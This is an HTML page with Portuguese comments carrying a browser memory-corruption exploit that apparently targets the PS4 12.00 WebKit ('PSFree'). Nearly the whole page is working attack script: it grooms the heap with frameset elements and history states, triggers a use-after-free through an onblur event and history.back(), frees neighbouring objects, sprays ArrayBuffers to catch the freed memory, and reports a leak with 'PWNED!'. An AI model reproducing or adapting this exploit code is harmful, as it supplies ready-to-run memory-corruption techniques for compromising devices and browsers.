<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - PSFree Native Implementation</title>
<style>
    body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 14px; }
    button { padding: 20px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; border: 2px solid #0f0; background: #003300; color: #fff; margin-bottom: 10px; }
    #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; background-color: #111; }
    .success { background-color: #fff; color: #000; font-weight: bold; border: 5px solid #0f0; }
</style>
</head>
<body>
<h2>PS4 12.00 - Neighborhood Freeing Attack</h2>
<div id="status">Método: Frameset Grooming + Neighbor Freeing</div>
<button onclick="runNativePSFree()">INICIAR EXPLOIT (LÓGICA NATIVA)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m) { 
    logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// =================================================================
// PARÂMETROS DO PSFREE.MJS
// =================================================================
// Para FW >= 9.00, ssv_len é 0x50 (80 bytes)
const SSV_LEN = 0x50; 

// Cálculo do payload do frameset para ocupar SSV_LEN no fastMalloc
// Fórmula: ssv_len / 8 - 2.  Para 80 bytes: 10 - 2 = 8 vírgulas.
const ROWS_PAYLOAD = ",".repeat(SSV_LEN / 8 - 2);

const NUM_FSETS = 0x180; // 384 framesets iniciais
const NUM_SPACES = 0x40; // 64 framesets de espaçamento
const NUM_ADJS = 8;      // Vizinhos a liberar (4 antes, 4 depois)
const NUM_REUSES = 0x300;// Quantos buffers de spray tentar

var fsets = []; // Armazena os framesets de grooming
var sprayed_views = []; // Armazena os buffers do spray final

// =================================================================
// LÓGICA DE EXPLOIT
// =================================================================

async function runNativePSFree() {
    logEl.textContent = "";
    fsets = [];
    sprayed_views = [];
    statusEl.textContent = "Preparando...";

    // 1. SETUP DO DOM
    const input = document.createElement("input");
    input.id = "trigger";
    document.body.appendChild(input);
    
    const anchor = document.createElement("a");
    anchor.id = "anchor";
    document.body.appendChild(anchor);

    log(`1. Configuração: Alvo=${SSV_LEN} bytes | Payload='${ROWS_PAYLOAD}'`);

    // 2. HEAP GROOMING (PREPARAÇÃO)
    // Criamos o "Tapete" de framesets onde o UAF vai cair
    log("2. Criando tapete de Framesets (Grooming)...");
    
    // Função auxiliar para criar lote de framesets
    function alloc_fs(count) {
        for(let i=0; i<count; i++) {
            let f = document.createElement("frameset");
            f.rows = ROWS_PAYLOAD;
            f.cols = ROWS_PAYLOAD; // Ocupa memória extra para garantir estabilidade
            fsets.push(f);
        }
    }

    // A. Estado Inicial
    history.replaceState("state0", "");
    
    // B. Aloca a primeira massa de framesets (384)
    alloc_fs(NUM_FSETS);
    
    // C. Empurra o Estado 1 (O ALVO UAF)
    // Ele deve cair logo após os framesets, adjacente a eles na memória
    log("   -> Alocando alvo UAF (state1)...");
    const target_idx = fsets.length; // Guardamos onde o alvo deve estar (teoricamente)
    history.pushState("state1", "", "#target");
    
    // D. Aloca espaçadores (64)
    // Isso coloca framesets DEPOIS do alvo, completando o sanduíche
    alloc_fs(NUM_SPACES);
    
    // E. Estado dummy (padding)
    history.pushState("state1_dummy", "", "#dummy");
    
    // F. Mais espaçadores
    alloc_fs(NUM_SPACES);
    
    // G. Estado Final (onde estamos agora)
    history.pushState("state2", "");

    log(`3. Grooming completo. Total Framesets: ${fsets.length}`);
    log("   Aguardando estabilização do DOM...");

    // Espera o documento estar pronto (Crucial no psfree)
    if (document.readyState !== "complete") {
        await new Promise(r => window.onload = r);
    }
    
    // 3. GATILHO ONBLUR (A MÁGICA)
    let triggered = false;
    
    input.onblur = function() {
        triggered = true;
        log(">>> [EVENTO] ONBLUR DISPARADO <<<");
        
        // --- PASSO CRÍTICO 1: LIBERAR VIZINHOS ---
        // Isso esvazia a "SmallLine" do bmalloc para forçar a reutilização
        log("   -> Liberando vizinhos...");
        
        // O alvo está teoricamente no índice 'target_idx' relativo aos framesets.
        // Liberamos alguns antes e alguns depois.
        // Como o history.pushState não entra no array 'fsets', usamos o final do primeiro bloco.
        // O alvo está ENTRE fsets[NUM_FSETS-1] e fsets[NUM_FSETS].
        // Vamos liberar o final do primeiro bloco e o começo do segundo bloco.
        
        let start_free = NUM_FSETS - (NUM_ADJS / 2);
        let end_free = NUM_FSETS + (NUM_ADJS / 2);
        
        for(let i = start_free; i < end_free; i++) {
            if(fsets[i]) {
                fsets[i].rows = "";
                fsets[i].cols = "";
            }
        }

        // --- PASSO CRÍTICO 2: SPRAY IMEDIATO ---
        // Sprayamos ArrayBuffers de 80 bytes (SSV_LEN)
        // O primeiro byte deve ser 0x41 ('A') para detecção
        log(`   -> Spraying ${NUM_REUSES} buffers de ${SSV_LEN} bytes...`);
        
        for(let i=0; i < NUM_REUSES; i++) {
            let buf = new ArrayBuffer(SSV_LEN);
            let view = new Uint8Array(buf);
            
            view[0] = 0x41; // Marcador 'A'
            view[1] = 0x41; // Marcador 'A'
            // Preenche o resto com 0 para ser limpo
            
            sprayed_views.push(view);
        }
    };

    // 4. DISPARO
    log("4. Focando input...");
    input.focus();
    await sleep(200);
    
    log("5. Executando history.back()...");
    history.back();

    await sleep(500);

    if(!triggered) {
        log("ERRO: Blur não disparou. Tente clicar na tela.");
        return;
    }

    // 5. CHECAGEM (LEAK CHECK)
    log("6. Verificando buffers...");
    let success = false;
    
    for(let i=0; i < sprayed_views.length; i++) {
        let view = sprayed_views[i];
        
        // Se o primeiro byte NÃO for 0x41, o WebKit escreveu algo em cima!
        if(view[0] !== 0x41) {
            success = true;
            log(`!!! LEAK DETECTADO NO BUFFER ${i} !!!`);
            
            // Dump dos primeiros 16 bytes
            let dump = "";
            for(let k=0; k<16; k++) dump += view[k].toString(16).padStart(2,'0') + " ";
            
            log(`DUMP: ${dump}`);
            statusEl.className = "success";
            statusEl.textContent = `PWNED! LEAK: ${dump}`;
            break;
        }
    }

    if(!success) {
        log("Falha: Buffers intactos. O vizinho não foi liberado corretamente ou o alinhamento falhou.");
    }
    
    // Cleanup
    input.remove();
    anchor.remove();
}
</script>
</body>
</html>
